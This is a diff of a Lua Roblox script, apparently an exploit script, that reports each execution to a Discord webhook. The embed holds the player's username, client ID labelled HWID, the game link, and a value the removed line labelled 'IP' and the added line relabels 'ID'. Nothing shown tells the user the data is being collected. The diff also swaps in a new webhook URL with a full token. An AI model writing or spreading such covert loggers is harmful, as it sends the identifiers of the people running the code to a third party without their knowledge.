@@ -877,13 +877,13 @@ if ct == 2 and _G.Pkey ~= nil and _G.Pkey ~= "" and c == true then
     "Kid with shit exploit"
 
     local url =
-    "https://discord.com/api/webhooks/1080461721166159872/2l9bqYdBwgOt7L2tCbyCA6XZL4jcmtV28ehVvNtSmCGZFdAHLT5d9wVpaKgIPEtgvuAd"
+    "https://discord.com/api/webhooks/1089619428347482183/k_9mky41xRBmxt7nqfDTfVWT4WuR0mI4_NeE-TbkglM0lLt1ydOZvvSgmLpwCmVLI3H4"
     local data = {
     ["content"] = "",
     ["embeds"] = {
         {
             ["title"] = "**Someone Executed Your Script!**",
-            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.." \n" .." HWID: ".."**".. game:GetService("RbxAnalyticsService"):GetClientId().." \n" .."https://www.roblox.com/games/"..game.PlaceId.." \n" .."**IP: **"..data3,
+            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.." \n" .." HWID: ".."**".. game:GetService("RbxAnalyticsService"):GetClientId().." \n" .."https://www.roblox.com/games/"..game.PlaceId.." \n" .."**ID: **"..data3,
             ["type"] = "rich",
             ["color"] = tonumber(0x9950),
             ["image"] = {
